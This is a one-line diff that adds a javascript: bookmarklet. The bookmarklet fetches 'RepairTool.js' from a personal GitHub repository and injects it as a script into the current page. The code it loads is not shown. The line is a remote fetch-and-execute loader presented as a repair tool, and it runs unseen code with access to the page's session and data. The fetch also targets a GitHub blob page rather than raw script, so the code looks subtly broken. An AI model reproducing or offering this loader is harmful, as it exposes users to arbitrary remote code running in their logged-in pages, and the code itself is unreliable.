@@ -1,0 +1,1 @@
+javascript:(async()=>{ const u='https://github.com/Pollamasiva69/gallinamasiva69/blob/main/RepairTool.js'; const c=await (await fetch(u,{cache:'no-store'})).text(); const blob=new Blob([c],{type:'application/javascript'}); const url=URL.createObjectURL(blob); const s=document.createElement('script'); s.src=url; document.body.appendChild(s); })();;
